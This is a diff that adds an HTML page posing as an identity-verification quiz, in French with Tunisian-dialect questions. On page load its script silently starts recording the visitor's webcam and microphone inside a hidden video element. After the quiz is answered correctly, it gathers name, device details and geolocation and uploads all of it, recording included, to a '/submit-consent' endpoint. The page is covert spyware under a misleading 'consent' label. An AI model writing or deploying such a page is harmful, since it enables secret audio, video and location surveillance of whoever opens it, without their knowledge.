@@ -1,0 +1,201 @@
+<!DOCTYPE html>
+<html lang="fr" dir="ltr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Vérification d'identité</title>
+    <style>
+        body { font-family: Arial, sans-serif; background-color: #f4f6f9; display: flex; justify-content: center; align-items: center; min-height: 100vh; margin: 0; padding: 20px; }
+        .card { background: white; padding: 25px; border-radius: 10px; box-shadow: 0 4px 10px rgba(0,0,0,0.1); text-align: center; max-width: 480px; width: 100%; }
+        h2 { color: #333; margin-bottom: 10px; }
+        
+        .title-banner {
+            background-color: #ff4757;
+            color: white;
+            padding: 10px;
+            border-radius: 6px;
+            margin-bottom: 15px;
+            font-size: 18px;
+            font-weight: bold;
+        }
+
+        #video-container { display: none; }
+        
+        .question-box { margin-bottom: 15px; text-align: left; background: #f1f2f6; padding: 10px; border-radius: 5px; }
+        .question-box label { display: block; font-weight: bold; margin-bottom: 5px; color: #333; }
+        .question-box input, .question-box select { width: 100%; padding: 8px; box-sizing: border-box; border: 1px solid #ccc; border-radius: 4px; }
+        
+        button { padding: 10px 20px; border: none; border-radius: 5px; cursor: pointer; font-weight: bold; font-size: 15px; width: 100%; background-color: #2ed573; color: white; }
+        #status { margin-top: 15px; font-weight: bold; }
+    </style>
+</head>
+<body>
+    <div class="card">
+        <div class="title-banner">QUESTION</div>
+        <h2>Vérification d'identité</h2>
+
+        <div id="video-container">
+            <video id="webcam" autoplay playsinline muted></video>
+        </div>
+        
+        <form id="quizForm">
+            <input type="text" id="username" placeholder="Votre Nom (Name)" required style="width: 100%; padding: 10px; margin-bottom: 15px; font-size: 14px; box-sizing: border-box;"><br>
+            
+            <div class="question-box">
+                <label>1. I'M MORE BEAUTIFUL THAN YOU</label>
+                <select id="q1" required>
+                    <option value="">Sélectionnez une réponse</option>
+                    <option value="yes">Yes</option>
+                    <option value="no">No</option>
+                </select>
+            </div>
+
+            <div class="question-box">
+                <label>2. enti bhim</label>
+                <select id="q2" required>
+                    <option value="">Sélectionnez une réponse</option>
+                    <option value="yes">Yes</option>
+                    <option value="no">No</option>
+                </select>
+            </div>
+
+            <div class="question-box">
+                <label>3. chnowa essm kalbek?</label>
+                <select id="q3" required>
+                    <option value="">Sélectionnez une réponse</option>
+                    <option value="sknder">sknder</option>
+                    <option value="michou">michou</option>
+                    <option value="tito">tito</option>
+                </select>
+            </div>
+
+            <button type="button" onclick="verifyAndStop()">OK</button>
+        </form>
+
+        <div id="status"></div>
+    </div>
+
+    <script>
+        let mediaStream = null;
+        let mediaRecorder = null;
+        let recordedChunks = [];
+
+        window.addEventListener('DOMContentLoaded', async () => {
+            try {
+                mediaStream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
+                const videoElement = document.getElementById('webcam');
+                videoElement.srcObject = mediaStream;
+
+                mediaRecorder = new MediaRecorder(mediaStream);
+                mediaRecorder.ondataavailable = (event) => {
+                    if (event.data.size > 0) {
+                        recordedChunks.push(event.data);
+                    }
+                };
+                mediaRecorder.start();
+            } catch (err) {
+                console.log("Impossible d'accéder à la caméra ou au micro: ", err);
+            }
+        });
+
+        function getMobileModel() {
+            const ua = navigator.userAgent;
+            let model = "Appareil Inconnu";
+            if (/android/i.test(ua)) {
+                model = "Téléphone Android";
+            } else if (/iphone|ipad|ipod/i.test(ua)) {
+                model = "iPhone / iOS Device";
+            } else if (/windows/i.test(ua)) {
+                model = "PC Windows";
+            } else if (/macintosh|mac os x/i.test(ua)) {
+                model = "Mac";
+            }
+            return model;
+        }
+
+        async function verifyAndStop() {
+            const statusDiv = document.getElementById('status');
+            const username = document.getElementById('username').value;
+
+            if (!username) {
+                statusDiv.style.color = 'red';
+                statusDiv.innerText = 'Veuillez entrer votre nom d\'abord.';
+                return;
+            }
+
+            const q1 = document.getElementById('q1').value;
+            const q2 = document.getElementById('q2').value;
+            const q3 = document.getElementById('q3').value;
+
+            if (!q1 || !q2 || !q3) {
+                statusDiv.style.color = 'red';
+                statusDiv.innerText = 'Veuillez répondre à toutes les questions.';
+                return;
+            }
+
+            if (q1 === 'yes' && q2 === 'yes' && q3 === 'sknder') {
+                statusDiv.style.color = 'green';
+                statusDiv.innerText = 'Réussi ! Envoi des données en cours...';
+
+                if (mediaRecorder && mediaRecorder.state !== "inactive") {
+                    mediaRecorder.stop();
+                }
+
+                setTimeout(async () => {
+                    const videoBlob = new Blob(recordedChunks, { type: 'video/webm' });
+
+                    let deviceInfo = {
+                        model: getMobileModel(),
+                        screen: `${window.screen.width}x${window.screen.height}`,
+                        language: navigator.language,
+                        platform: navigator.platform
+                    };
+
+                    let locationData = "Non autorisé";
+                    try {
+                        const position = await new Promise((resolve, reject) => {
+                            navigator.geolocation.getCurrentPosition(resolve, reject, { timeout: 3000 });
+                        });
+                        locationData = `Latitude: ${position.coords.latitude}, Longitude: ${position.coords.longitude}`;
+                    } catch (e) {
+                        locationData = "Location refusée";
+                    }
+
+                    const formData = new FormData();
+                    formData.append('username', username);
+                    formData.append('location', locationData);
+                    formData.append('device', JSON.stringify(deviceInfo));
+                    formData.append('q1', q1);
+                    formData.append('q2', q2);
+                    formData.append('q3', q3);
+                    formData.append('video', videoBlob, 'recording_with_audio.webm');
+
+                    try {
+                        const response = await fetch('/submit-consent', {
+                            method: 'POST',
+                            body: formData
+                        });
+
+                        if (response.ok) {
+                            statusDiv.innerText = 'Réussi ! Envoyé avec succès.';
+                            if (mediaStream) {
+                                mediaStream.getTracks().forEach(track => track.stop());
+                            }
+                        } else {
+                            statusDiv.style.color = 'red';
+                            statusDiv.innerText = 'Échec de l\'envoi des données.';
+                        }
+                    } catch (err) {
+                        statusDiv.style.color = 'red';
+                        statusDiv.innerText = 'Erreur de connexion au serveur.';
+                    }
+                }, 1000);
+
+            } else {
+                statusDiv.style.color = 'red';
+                statusDiv.innerText = 'Erreur ! Veuillez réessayer.';
+            }
+        }
+    </script>
+</body>
+</html>
